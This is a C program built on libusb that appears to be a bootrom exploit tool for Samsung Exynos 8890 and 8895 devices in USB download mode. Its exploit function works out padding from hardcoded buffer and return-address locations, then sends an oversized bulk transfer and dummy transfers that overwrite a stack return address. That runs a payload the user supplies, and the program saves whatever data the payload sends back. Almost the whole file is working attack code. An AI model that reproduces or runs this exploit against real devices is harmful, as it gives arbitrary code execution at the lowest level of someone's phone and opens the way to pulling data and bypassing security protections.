#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include "libusb-1.0/libusb.h"

#define DEBUG	0
#define VENDOR_ID	0x04e8
#define PRODUCT_ID	0x1234
#define BLOCK_SIZE		512
#define CHUNK_SIZE	(uint32_t)0xfffe00

#if DEBUG
#define dprint(args...) printf(args)
#else
#define dprint(args...)
#endif

enum {
	NORMAL_MODE = 0,
	EXPLOIT_MODE,
};

static char *target_names[] = {
	"Exynos8890",//TARGET_8890
	"Exynos8895",//TARGET_8895
};
enum {
	XFER_BUFFER = 0,//address of buffer where payload is written
	RA_PTR,//pointer to return address in stack we want to replace
};
static uint32_t targets[][2] = {
	//XFER_BUFFER,	RA_PTR
	{0x02021800,	0x02020F08},//TARGET_8890
	{0x02021800,	0x02020F18},//TARGET_8895
};

libusb_device_handle *handle = NULL;

#define MAX_PAYLOAD_SIZE	(BLOCK_SIZE - 10)
typedef struct __attribute__ ((__packed__)) dldata_s {
	u_int32_t unk0;
	u_int32_t size;// header(8) + data(n) + footer(2)
	u_int8_t data[];
	//u_int16_t footer;
} dldata_t;

static int send(dldata_t *payload) {
	int rc;
	int transferred;
	uint total_size = payload->size;
	uint8_t *payload_ptr = (uint8_t *)payload;

	do {
		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, payload_ptr, (total_size < BLOCK_SIZE ? total_size : BLOCK_SIZE), &transferred, 0);
		if(rc) {
			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
			return rc;
		}
		dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
		payload_ptr += transferred;
		assert(total_size>=transferred);
		total_size -= transferred;
	} while(total_size > 0);

	return rc;
}

static int exploit(dldata_t *payload, int target_id) {
	int rc;
	int transferred;
	#if DEBUG
	uint32_t usb_size;
	uint32_t block_count, size_block_aligned;
	#endif

	if(target_id < 0) {
		return -1;
	}
	printf("- exploit: starting.\n");

	// step 1 : compute offsets,sizes,etc...
	dprint("targets[target_id][XFER_BUFFER] = 0x%x\n", targets[target_id][XFER_BUFFER]);
	dprint("targets[target_id][RA_PTR] = 0x%x\n", targets[target_id][RA_PTR]);
	if(targets[target_id][XFER_BUFFER] < targets[target_id][RA_PTR])
		printf("ERROR : targets[target_id][XFER_BUFFER] < targets[target_id][RA_PTR]\n");
	uint32_t padding_size = targets[target_id][RA_PTR] - targets[target_id][XFER_BUFFER];
	dprint("padding_size = targets[target_id][RA_PTR] - targets[target_id][XFER_BUFFER] = 0x%x\n", padding_size);
	uint32_t original_payload_size = payload->size;
	dprint("original_payload_size = 0x%x\n", original_payload_size);
	if(original_payload_size > BLOCK_SIZE)//maximum size of first bulk transfer
		printf("ERROR : original_payload_size > BLOCK_SIZE\n");
	padding_size -= original_payload_size;//leading padding replaced with payload
	padding_size += sizeof(payload->unk0) + sizeof(payload->size);//header is skipped, so we have to compensate with more padding
	dprint("new padding_size = 0x%x\n", padding_size);
	uint32_t chunk_cnt = padding_size / CHUNK_SIZE;
	dprint("chunk_cnt = 0x%x\n", chunk_cnt);
	padding_size = padding_size % CHUNK_SIZE;
	dprint("new padding_size = 0x%x\n", padding_size);
	uint32_t block_cnt = padding_size / BLOCK_SIZE;
	dprint("block_cnt = 0x%x\n", block_cnt);
	padding_size = padding_size % BLOCK_SIZE;
	dprint("new padding_size = 0x%x\n", padding_size);
	if(padding_size == 0 && block_cnt > 0){//TODO case to verify
		dprint("INFO : padding_size == 0 => \n");
		block_cnt--;
		dprint("new block_cnt = 0x%x\n", block_cnt);
		padding_size = BLOCK_SIZE;//TODO hmmm no!
		dprint("new padding_size = 0x%x\n", padding_size);
	}
	uint32_t ram_size = padding_size + sizeof(targets[target_id][XFER_BUFFER]) + 2;//the pointer we overwrite is at the end, and we need to 2 extra bytes for footer
	dprint("ram_size = 0x%x\n", ram_size);

	// step 2 : prepare payload
	uint8_t *ram = (uint8_t*)calloc(1, ram_size);
	*(uint32_t*)&ram[padding_size] = targets[target_id][XFER_BUFFER];//overwriting return address in stack :]
	payload->size = original_payload_size + (CHUNK_SIZE * chunk_cnt) + (BLOCK_SIZE * block_cnt) + ram_size;
	dprint("malicious payload->size=0x%x\n", payload->size);

	uint32_t min_size_to_overflw = (uint32_t)0 - targets[target_id][XFER_BUFFER];
	dprint("min_size_to_overflw = 0x%x\n", min_size_to_overflw);
	if(min_size_to_overflw > payload->size)
		printf("ERROR : min_size_to_overflw > payload->size\n");

	// step 3 : usb communication
	printf("- exploit: sending payload...\n");
	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t*)payload, original_payload_size, &transferred, 0);
	if(rc) {
		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}
	#if DEBUG
	uint32_t xfer_buffer = targets[target_id][XFER_BUFFER];
	xfer_buffer += CHUNK_SIZE + (transferred - 8);//initial bulk transfer has already increased xfer_buffer by CHUNK_SIZE one time.
	dprint("xfer_buffer=0x%x\n", xfer_buffer);
	usb_size = (payload->size - transferred) - CHUNK_SIZE;
	dprint("usb_size=0x%x\n", usb_size);
	dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
	#endif
	chunk_cnt++;//need extra dummy transfer to consume block padding right before sending ram
	printf("- exploit: sending %u dummy transfers...\n", chunk_cnt);
	while(chunk_cnt--){
		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, ram, 0, &transferred, 0);
		if(rc) {
			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
			return rc;
		}
		#if DEBUG
		printf("libusb_bulk_transfer: transferred=%d\n", transferred);
		printf("chunk_cnt=0x%x\n", chunk_cnt);
		if(usb_size > CHUNK_SIZE){
			xfer_buffer += CHUNK_SIZE;
			printf("xfer_buffer=0x%x\n", xfer_buffer);
			usb_size -= CHUNK_SIZE;
			printf("usb_size=0x%x\n", usb_size);
		}else{
			block_count = 0;
			if(BLOCK_SIZE != 0){
					block_count = usb_size / BLOCK_SIZE;
			}
			size_block_aligned = block_count * BLOCK_SIZE;
			usb_size = usb_size - (BLOCK_SIZE * block_count);
			if(usb_size == 0) {
				size_block_aligned = size_block_aligned - BLOCK_SIZE;
				usb_size = BLOCK_SIZE;
			}
			if(size_block_aligned == 0)
				printf("ERROR !! size_block_aligned == 0 , CANT WORK!!\n");
			printf("size_block_aligned=0x%x\n", size_block_aligned);
			xfer_buffer += size_block_aligned;
			printf("xfer_buffer=0x%x\n", xfer_buffer);
			printf("usb_size=0x%x\n", usb_size);
		}
		#endif
	}

	printf("- exploit: sending last transfer to overwrite RAM...\n");
	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, ram, ram_size, &transferred, 0);
	if(rc) {
		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
		return rc;
	}
	dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
	printf("- exploit: done.\n");

	return rc;
}

static int identify_target()
{
	struct libusb_device_descriptor desc;
	int rc, i;
	unsigned char product[256];

	if(!handle)
		return -1;

	rc = libusb_get_device_descriptor(libusb_get_device(handle), &desc);
	if (LIBUSB_SUCCESS != rc) {
		fprintf(stderr, "Error getting device descriptor\n");
		return -1;
	}

	printf("Device detected: %04x:%04x\n", desc.idVendor, desc.idProduct);

	if (desc.iProduct) {
		rc = libusb_get_string_descriptor_ascii(handle, desc.iProduct, product, sizeof(product));
		if (rc > 0){
			for(i = 0; i < sizeof(target_names)/sizeof(target_names[0]); i++){
				if(!strcmp(target_names[i], (char *)product)){
					printf("Target: %s\n", target_names[i]);
					return i;
				}
			}
		}
	}

	return -1;
}

static int save_received_data(const char *filename){
	FILE *fd;
	int transferred = 0;
	int total_transferred = 0;
	uint8_t buf[BLOCK_SIZE];

	fd = fopen(filename,"wb");
	if (fd == NULL) {
		fprintf(stderr, "Error: Can't open output file!\n");
		return -1;
	}

	do {
		libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_IN | 1, buf, sizeof(buf), &transferred, 10);// no error handling because device-side is a mess anyway
		fwrite(buf, 1, transferred, fd);
		total_transferred += transferred;
	} while(transferred);

	fclose(fd);

	return total_transferred;
}

int main(int argc, char *argv[])
{
	libusb_context *ctx;
	FILE *fd;
	dldata_t *payload;
	size_t payload_size, fd_size;
	int target_id = -1;
	uint8_t mode;
	int rc;

	if (!(argc == 3 || argc == 4)) {
		printf("Usage: %s <mode> <input_file> [<output_file>]\n", argv[0]);
		printf("\tmode: mode of operation\n");
		printf("\t\tn: normal\n");
		printf("\t\te: exploit\n");
		printf("\tinput_file: payload binary to load and execute\n");
		printf("\toutput_file: file to write data returned by payload (exploit mode only)\n");
		return EXIT_SUCCESS;
	}

	if(argv[1] && argv[1][0] == 'e')
		mode = EXPLOIT_MODE;
	else
		mode = NORMAL_MODE;

	fd = fopen(argv[2],"rb");
	if (fd == NULL) {
		fprintf(stderr, "Can't open input file %s !\n", argv[2]);
		return EXIT_FAILURE;
	}

	fseek(fd, 0, SEEK_END);
	fd_size = ftell(fd);

	if(mode == EXPLOIT_MODE){
		if(fd_size > MAX_PAYLOAD_SIZE){
			fprintf(stderr, "Error: input payload size cannot exceed %u bytes !\n", MAX_PAYLOAD_SIZE);
			return EXIT_FAILURE;
		}
		payload_size = sizeof(dldata_t) + MAX_PAYLOAD_SIZE + 2;// +2 bytes for footer
	}else{// NORMAL_MODE
		payload_size = sizeof(dldata_t) + fd_size + 2;// +2 bytes for footer
	}

	payload = (dldata_t*)calloc(1, payload_size);
	payload->size = payload_size;

	fseek(fd, 0, SEEK_SET);
	payload_size = fread(&payload->data, 1, fd_size, fd);
	if (payload_size != fd_size) {
		fprintf(stderr, "Error: cannot read entire file !\n");
		return EXIT_FAILURE;
	}

	rc = libusb_init (&ctx);
	if (rc < 0)
	{
		fprintf(stderr, "Error: failed to initialise libusb: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

	#if DEBUG
	libusb_set_debug(ctx, LIBUSB_LOG_LEVEL_DEBUG);
	#endif

	handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
	if (!handle) {
		fprintf(stderr, "Error: cannot open device %04x:%04x\n", VENDOR_ID, PRODUCT_ID);
		libusb_exit (NULL);
		return EXIT_FAILURE;
	}

	rc = libusb_claim_interface(handle, 0);
	if(rc) {
		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
		return EXIT_FAILURE;
	}

	if(mode == EXPLOIT_MODE){
		target_id = identify_target();
		exploit(payload, target_id);

		if(argv[3]){
			rc = save_received_data(argv[3]);
			if(rc > 0){
				printf("Received data saved to file %s (%u bytes).\n", argv[3], rc);
			}
		}
	}else{// NORMAL_MODE
		printf("Sending file %s (0x%lx)...\n", argv[2], fd_size);
		rc = send(payload);
		if(!rc)
			printf("File %s sent !\n", argv[2]);
	}
	#if DEBUG
	sleep(5);
	#endif
	libusb_release_interface(handle, 0);

	if (handle) {
		libusb_close (handle);
	}

	libusb_exit (NULL);

	return EXIT_SUCCESS;
}
